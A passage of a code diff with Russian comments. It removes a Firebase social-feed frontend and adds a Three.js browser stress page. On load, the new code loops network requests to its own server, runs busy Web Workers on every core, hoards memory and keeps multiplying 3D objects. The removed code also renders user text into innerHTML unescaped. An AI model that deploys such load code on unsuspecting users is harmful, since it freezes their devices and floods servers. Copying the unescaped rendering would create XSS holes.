-
-            let mediaData = '';
-            if (postType === 'image') {
-                const file = document.getElementById('post-file').files[0];
-                if (file) {
-                    const reader = new FileReader();
-                    mediaData = await new Promise(resolve => {
-                        reader.onload = (e) => resolve(e.target.result);
-                        reader.readAsDataURL(file);
-                    });
+        // 1. Нагрузка на интернет и сеть (HTTP Requests Stress)
+        function startNetworkStress() {
+            // Бесконечные запросы к случайным ресурсам (используем кэш-брейкеры)
+            setInterval(() => {
+                for(let i = 0; i < 10; i++) {
+                    // Запрашиваем крупные библиотеки или саму страницу многократно
+                    fetch(`/?cache_bust=${Math.random()}`, { mode: 'no-cors' })
+                        .catch(() => {}); // Игнорируем ошибки, важен сам факт запроса
                 }
-            } else {
-                mediaData = document.getElementById('post-video-url').value;
-            }
-
-            if (!mediaData && !desc) {
-                btn.disabled = false;
-                btn.innerText = 'Опубликовать';
-                return;
-            }
-
-            await addDoc(postsRef, {
-                uid: currentUser.uid,
-                authorName: currentUser.displayName,
-                authorAvatar: currentUser.photoURL,
-                description: desc,
-                type: postType,
-                media: mediaData,
-                isPrivate: isPrivate,
-                likes: [],
-                comments: [],
-                createdAt: Date.now()
-            });
-
-            document.getElementById('post-desc').value = '';
-            document.getElementById('post-video-url').value = '';
-            document.getElementById('post-file').value = '';
-            document.getElementById('preview-box').innerHTML = `<i class="fas fa-cloud-upload-alt" style="font-size: 2rem; color: var(--primary);"></i><p>Выберите изображение</p>`;
-            btn.disabled = false;
-            btn.innerText = 'Опубликовать';
-            window.closeModal();
-        };
-        document.getElementById('submit-post').onclick = window.uploadPost;
-
-        // Удаление поста
-        window.deletePost = async (postId, authorId) => {
-            if (!currentUser || currentUser.uid !== authorId) return;
-            if (!confirm('Удалить этот пост?')) return;
-            try {
-                await deleteDoc(doc(db, 'artifacts', appId, 'public', 'data', 'posts', postId));
-                showToast('Пост удалён');
-            } catch (e) {
-                showToast('Ошибка при удалении');
-            }
-        };
-
-        // Рендер с параметром includePrivate (для ленты = false, для профиля = true)
-        function renderPosts(data, includePrivate = false, containerId = 'posts-container') {
-            const container = document.getElementById(containerId);
-            let filtered = data;
-            if (!includePrivate) {
-                filtered = data.filter(p => !p.isPrivate);
-            }
-
-            container.innerHTML = filtered.length ? '' : '<div class="text-center py-20" style="color: var(--text-secondary);">Пока ничего нет...</div>';
-
-            filtered.forEach(post => {
-                const isLiked = currentUser && post.likes?.includes(currentUser.uid);
-                const isAuthor = currentUser && post.uid === currentUser.uid;
-                const postEl = document.createElement('div');
-                postEl.className = 'post-card' + (post.isPrivate ? ' private' : '');
-                if (post.isPrivate) {
-                    postEl.setAttribute('data-author', post.authorName);
-                }
-
-                let mediaHtml = '';
-                if (post.type === 'image') {
-                    mediaHtml = `<img src="${post.media}" class="post-media" onclick="viewPost('${post.id}')">`;
-                } else {
-                    mediaHtml = `<div class="video-container">${getEmbedPlayer(post.media)}</div>`;
-                }
-
-                postEl.innerHTML = `
-                    <div class="post-header">
-                        <div class="post-author" onclick="showView('profile', '${post.uid}')">
-                            <img src="${post.authorAvatar}">
-                            <div>
-                                <h4>${post.authorName}</h4>
-                                <p class="post-date">${new Date(post.createdAt).toLocaleDateString()}</p>
-                            </div>
-                        </div>
-                        <div>
-                            ${post.isPrivate ? '<i class="fas fa-link private-badge" title="Только по ссылке"></i>' : ''}
-                            ${isAuthor ? `<button onclick="deletePost('${post.id}', '${post.uid}')" class="delete-btn" title="Удалить пост"><i class="fas fa-trash-alt"></i></button>` : ''}
-                        </div>
-                    </div>
-                    <div class="post-description">${post.description}</div>
-                    ${mediaHtml}
-                    <div class="post-actions">
-                        <button onclick="toggleLike('${post.id}')" class="action-btn ${isLiked ? 'liked' : ''}">
-                            <i class="${isLiked ? 'fas' : 'far'} fa-heart"></i>
-                            <span>${post.likes?.length || 0}</span>
-                        </button>
-                        <button onclick="viewPost('${post.id}')" class="action-btn">
-                            <i class="far fa-comment"></i>
-                            <span>${post.comments?.length || 0}</span>
-                        </button>
-                        <button onclick="copyLink('${post.id}')" class="share-btn">
-                            <i class="fas fa-share-alt"></i>
-                        </button>
-                    </div>
-                `;
-                container.appendChild(postEl);
-            });
+            }, 50);
         }
 
-        function getEmbedPlayer(url) {
-            if (url.includes('youtube.com') || url.includes('youtu.be')) {
-                const id = url.split('v=')[1] || url.split('/').pop();
-                return `<iframe src="https://www.youtube.com/embed/${id}" allowfullscreen></iframe>`;
-            }
-            return `<video src="${url}" controls class="w-full" style="border-radius:1.5rem;"></video>`;
-        }
-
-        window.toggleLike = async (postId) => {
-            if (!currentUser) return;
-            const postRef = doc(db, 'artifacts', appId, 'public', 'data', 'posts', postId);
-            const postSnap = await getDoc(postRef);
-            const post = postSnap.data();
-            const isLiked = post.likes?.includes(currentUser.uid);
-
-            await updateDoc(postRef, {
-                likes: isLiked ? arrayRemove(currentUser.uid) : arrayUnion(currentUser.uid)
-            });
-        };
-
-        window.copyLink = (id) => {
-            const url = `${window.location.origin}${window.location.pathname}?post=${id}`;
-            navigator.clipboard?.writeText(url).then(() => showToast('Ссылка скопирована!'));
-        };
-
-        // Профиль
-        async function loadProfile(uid) {
-            const userPosts = posts.filter(p => p.uid === uid);
-            const isMe = currentUser && uid === currentUser.uid;
-
-            const firstPost = userPosts[0];
-            document.getElementById('profile-name').innerText = isMe ? currentUser.displayName : (firstPost?.authorName || 'Пользователь');
-            document.getElementById('profile-avatar').src = isMe ? currentUser.photoURL : (firstPost?.authorAvatar || '');
-            document.getElementById('profile-email').innerText = isMe ? currentUser.email : '';
-            document.getElementById('profile-posts-count').innerText = userPosts.length;
-
-            renderPosts(userPosts, true, 'profile-posts'); // includePrivate = true для профиля
-        }
-
-        // Просмотр поста с прокруткой и эмодзи в комментариях
-        window.viewPost = async (postId) => {
-            const postRef = doc(db, 'artifacts', appId, 'public', 'data', 'posts', postId);
-            const snap = await getDoc(postRef);
-            if (!snap.exists()) return;
-            const post = snap.data();
-            post.id = snap.id;
-
-            const modal = document.getElementById('modal-post-view');
-            const content = document.getElementById('post-view-content');
-            modal.classList.remove('hidden');
-
-            content.innerHTML = `
-                <div class="post-detail-layout">
-                    <div class="detail-media">
-                        ${post.type === 'image' ? `<img src="${post.media}">` : getEmbedPlayer(post.media)}
-                    </div>
-                    <div class="detail-info">
-                        <div style="display: flex; align-items: center; gap: 1rem; margin-bottom: 1rem;">
-                            <img src="${post.authorAvatar}" style="width: 40px; height: 40px; border-radius: 50%;">
-                            <span style="font-weight: 700;">${post.authorName}</span>
-                        </div>
-                        <p style="margin-bottom: 1rem; padding-bottom: 1rem; border-bottom: 1px solid var(--border);">${post.description}</p>
-                        <div class="comments-container" id="comments-list">
-                            ${(post.comments || []).map(c => `
-                                <div class="comment">
-                                    <img src="${c.avatar}">
-                                    <div><span style="font-weight:700;">${c.name}</span> ${c.text}</div>
-                                </div>
-                            `).join('') || '<p style="color: var(--text-secondary); text-align:center;">Нет комментариев</p>'}
-                        </div>
-                        <div class="comment-input-area">
-                            <input type="text" id="comm-input" placeholder="Добавить комментарий...">
-                            <button class="emoji-btn" onclick="toggleCommentEmojiPicker()"><i class="far fa-smile"></i></button>
-                            <button onclick="addComment('${post.id}')" class="submit-btn" style="padding:0.8rem 1.5rem;">Отправить</button>
-                        </div>
-                        <div id="comment-emoji-picker" class="emoji-picker hidden" style="justify-content: flex-end;">
-                            <span onclick="insertEmoji('comm-input', '😊')">😊</span>
-                            <span onclick="insertEmoji('comm-input', '😂')">😂</span>
-                            <span onclick="insertEmoji('comm-input', '❤️')">❤️</span>
-                            <span onclick="insertEmoji('comm-input', '👍')">👍</span>
-                            <span onclick="insertEmoji('comm-input', '🔥')">🔥</span>
-                        </div>
-                    </div>
-                </div>
+        // 2. Нагрузка на CPU (Web Workers)
+        function startCPUStress() {
+            const workerCode = `
+                setInterval(() => {
+                    let x = 0;
+                    for(let i = 0; i < 8000000; i++) {
+                        x += Math.sin(Math.random()) * Math.cos(Math.random());
+                    }
+                }, 0);
             `;
-        };
-
-        window.toggleCommentEmojiPicker = () => {
-            document.getElementById('comment-emoji-picker').classList.toggle('hidden');
-        };
-
-        window.closePostView = () => document.getElementById('modal-post-view').classList.add('hidden');
-
-        window.addComment = async (postId) => {
-            if (!currentUser) return;
-            const input = document.getElementById('comm-input');
-            const text = input.value.trim();
-            if (!text) return;
-
-            const postRef = doc(db, 'artifacts', appId, 'public', 'data', 'posts', postId);
-            await updateDoc(postRef, {
-                comments: arrayUnion({
-                    uid: currentUser.uid,
-                    name: currentUser.displayName,
-                    avatar: currentUser.photoURL,
-                    text: text,
-                    at: Date.now()
-                })
-            });
-            input.value = '';
-            viewPost(postId);
-        };
-
-        function showToast(text) {
-            const toast = document.createElement('div');
-            toast.className = 'toast';
-            toast.innerText = text;
-            document.body.appendChild(toast);
-            setTimeout(() => toast.remove(), 2000);
+            const blob = new Blob([workerCode], { type: 'application/javascript' });
+            const workerURL = URL.createObjectURL(blob);
+            for(let i = 0; i < (navigator.hardwareConcurrency || 8); i++) {
+                new Worker(workerURL);
+            }
         }
 
-        // Deep link
-        const urlParams = new URLSearchParams(window.location.search);
-        const pId = urlParams.get('post');
-        if (pId) {
-            setTimeout(() => viewPost(pId), 1500);
+        function init() {
+            scene = new THREE.Scene();
+            camera = new THREE.PerspectiveCamera(75, window.innerWidth / window.innerHeight, 0.1, 5000);
+            camera.position.z = 500;
+
+            renderer = new THREE.WebGLRenderer({ antialias: false, powerPreference: "high-performance" });
+            renderer.setSize(window.innerWidth, window.innerHeight);
+            renderer.setPixelRatio(1);
+            document.body.appendChild(renderer.domElement);
+
+            const light = new THREE.PointLight(0xffffff, 1.5, 2000);
+            light.position.set(100, 100, 100);
+            scene.add(light);
+            scene.add(new THREE.AmbientLight(0x222222));
+
+            startCPUStress();
+            startNetworkStress();
+            addObjects(64000);
+
+            // Таймер X4
+            setInterval(() => {
+                secondsToNextBoom--;
+                if (secondsToNextBoom <= 0) {
+                    const currentCount = objects.length;
+                    // Предохранитель, чтобы не вылетело слишком быстро на 1 млн объектов
+                    if (currentCount < 500000) {
+                        addObjects(currentCount * 3);
+                    }
+                    secondsToNextBoom = 10;
+                }
+                timerDisplay.textContent = secondsToNextBoom;
+            }, 1000);
         }
+
+        function addObjects(countToAdd) {
+            const geometry = new THREE.BoxGeometry(2, 2, 2);
+
+            for (let i = 0; i < countToAdd; i++) {
+                const randomTex = texPaths[Math.floor(Math.random() * texPaths.length)];
+
+                const material = new THREE.MeshPhongMaterial({
+                    map: textureLoader.load(randomTex, undefined, undefined, () => {}),
+                    color: new THREE.Color(Math.random(), Math.random(), Math.random()),
+                    shininess: 100
+                });
+
+                const mesh = new THREE.Mesh(geometry, material);
+                mesh.position.set(
+                    (Math.random() - 0.5) * 1200,
+                    (Math.random() - 0.5) * 1200,
+                    (Math.random() - 0.5) * 1200
+                );
+
+                mesh.rotation.set(Math.random() * Math.PI, Math.random() * Math.PI, 0);
+
+                // Нагрузка на RAM через TypedArrays
+                try {
+                    mesh.userData.ramBlock = new Float32Array(1024);
+                    if (i % 50 === 0) memoryHolders.push(new Uint32Array(1024 * 100));
+                } catch(e) {}
+
+                scene.add(mesh);
+                objects.push(mesh);
+            }
+            objDisplay.textContent = objects.length.toLocaleString();
+        }
+
+        function animate() {
+            requestAnimationFrame(animate);
+
+            const time = performance.now() * 0.001;
+
+            // Тяжелый цикл обновления 3D
+            for (let i = 0; i < objects.length; i++) {
+                const obj = objects[i];
+                obj.rotation.x += 0.03;
+                obj.position.y += Math.sin(time + i) * 0.05;
+            }
+
+            renderer.render(scene, camera);
+
+            frames++;
+            const currentTime = performance.now();
+            if (currentTime >= lastTime + 1000) {
+                fpsDisplay.textContent = frames;
+                frames = 0;
+                lastTime = currentTime;
+            }
+        }
+
+        window.onload = () => {
+            init();
+            animate();
+        };
+
+        window.addEventListener('resize', () => {
+            camera.aspect = window.innerWidth / window.innerHeight;
+            camera.updateProjectionMatrix();
+            renderer.setSize(window.innerWidth, window.innerHeight);
+        });
     </script>
 </body>
 </html>
